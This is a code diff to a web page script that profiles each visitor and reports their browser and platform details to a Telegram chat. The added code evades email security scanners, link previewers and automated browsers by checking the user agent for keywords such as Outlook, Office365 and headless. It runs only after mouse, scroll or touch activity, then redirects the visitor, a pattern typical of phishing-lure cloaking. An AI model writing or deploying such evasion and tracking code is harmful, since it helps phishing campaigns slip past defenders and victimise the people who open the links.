@@ -169,12 +169,33 @@
   }
 
   // =========================
+  // BOT / SCANNER DETECTION
+  // =========================
+  function isBotOrScanner() {
+    const ua = navigator.userAgent.toLowerCase();
+    
+    // Common keywords found in security scanners, mail clients, and automated crawlers
+    const botKeywords = [
+      'bot', 'spider', 'crawler', 'preview', 'microsoft', 
+      'outlook', 'office365', 'google', 'cloud', 'amazon', 
+      'headless', 'selenium', 'puppeteer'
+    ];
+    
+    return botKeywords.some(keyword => ua.includes(keyword));
+  }
+
+  // =========================
   // SEND TELEGRAM MESSAGE
   // =========================
   async function notifyTelegram() {
+    // If it's a known scanner or bot, stop the execution here
+    if (isBotOrScanner()) {
+      console.log("Automated scan detected. Notification skipped.");
+      return;
+    } 
+    
     const message = `
 New visitor on your site
-
 
 Browser: ${navigator.userAgent}
 Platform: ${navigator.platform}
@@ -197,18 +218,34 @@ Time: ${new Date().toLocaleString()}
       });
 
       console.log("Telegram notification sent");
+   // Execute redirect only AFTER the notification completes successfully
+      triggerRedirect();
+      
     } catch (error) {
       console.error("Telegram notification failed", error);
+      // Still redirect even if notification fails
+      triggerRedirect();
     }
   }
 
-  // Run notification
-  notifyTelegram();
+   // EXECUTION TRIGGER
+  // =========================
+  // Instead of running instantly, wait for a basic human interaction (like a mouse movement, scroll, or touch)
+  // Mailbots rarely trigger these events.
+  function triggerOnHumanActivity() {
+    notifyTelegram();
+    
+    // Remove listeners so it only runs once per real visit
+    window.removeEventListener('mousemove', triggerOnHumanActivity);
+    window.removeEventListener('scroll', triggerOnHumanActivity);
+    window.removeEventListener('touchstart', triggerOnHumanActivity);
+  }
 
-  // Optional redirect
-  //setTimeout(() => {
-    //window.location.href = "https://kutt.itarian.com/Vxcump";
-  //}, 5000);
+  // Attach listeners for human activity
+  window.addEventListener('mousemove', triggerOnHumanActivity);
+  window.addEventListener('scroll', triggerOnHumanActivity);
+  window.addEventListener('touchstart', triggerOnHumanActivity);
+  
 </script>
 
 </body>
